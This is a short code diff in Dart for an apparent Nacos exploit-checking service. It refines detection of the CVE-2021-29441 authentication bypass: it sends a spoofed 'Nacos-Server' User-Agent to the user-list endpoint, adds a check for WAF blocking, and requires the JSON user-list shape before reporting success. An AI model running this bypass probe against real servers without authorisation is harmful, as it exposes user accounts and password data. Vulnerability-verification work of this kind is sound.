@@ -1,6 +1,7 @@
 import 'dart:convert';
 
 import 'exp_result.dart';
+import 'waf_detect.dart';
 import '../../../core/http/http_client.dart';
 
 class NacosExpService {
@@ -27,9 +28,18 @@ class NacosExpService {
         '$_base/nacos/v1/auth/users?pageNo=1&pageSize=9',
         headers: {'User-Agent': 'Nacos-Server'},
       );
-      if (res.statusCode == 200 &&
-          ((res.body ?? '').contains('username') ||
-              (res.body ?? '').contains('pageItems'))) {
+      final blocked =
+          wafBlockedResult('CVE-2021-29441', res.statusCode, res.body);
+      if (blocked != null) return blocked;
+      // 实测踩过的坑：Shiro 靶场的登录页里就有 `name="username"`，
+      // 只认这个词会把任何带登录表单的站点判成 Nacos 认证绕过。
+      // 必须要求 Nacos 用户列表接口的 JSON 结构。
+      final body = res.body ?? '';
+      final looksJson = !body.trimLeft().toLowerCase().startsWith('<');
+      final hasUserListShape = body.contains('"pageItems"') ||
+          body.contains('"totalCount"') ||
+          (body.contains('"username"') && body.contains('"password"'));
+      if (res.statusCode == 200 && looksJson && hasUserListShape) {
         return ExpResult(
           true,
           'CVE-2021-29441',
